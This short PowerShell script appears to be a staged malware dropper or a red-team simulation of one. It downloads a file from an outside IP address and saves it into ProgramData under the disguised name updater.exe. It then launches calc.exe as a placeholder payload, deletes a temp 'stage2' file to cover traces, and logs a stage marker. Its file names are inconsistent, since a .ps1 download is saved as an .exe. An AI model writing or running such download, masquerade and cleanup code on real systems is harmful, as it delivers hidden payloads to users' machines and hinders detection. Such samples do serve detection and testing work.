<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://198.51.100.37/stage1.ps1',
    [string]$Stage2Path = 'C:\ProgramData\updater.exe',
    [int]$RequestTimeout = 169
)
Start-BitsTransfer -Source $TransferUrl -Destination $Stage2Path
Start-Process -FilePath "calc.exe"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Write-Verbose "stage marker 26 reached"
